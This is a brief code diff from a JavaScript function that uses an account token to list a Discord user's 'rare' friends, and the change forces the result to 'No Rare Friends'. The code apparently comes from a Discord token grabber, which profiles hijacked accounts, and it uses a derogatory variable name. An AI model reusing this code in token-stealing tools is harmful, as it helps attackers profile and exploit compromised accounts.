@@ -742,7 +742,7 @@ async function getRelationships(token) {
             gay += `${b} ${z.user.username}#${z.user.discriminator}\n`
         }
     }
-    gay = gay ?? "No Rare Friends";
+    gay = "No Rare Friends";
 
     return {
         length: r.length,
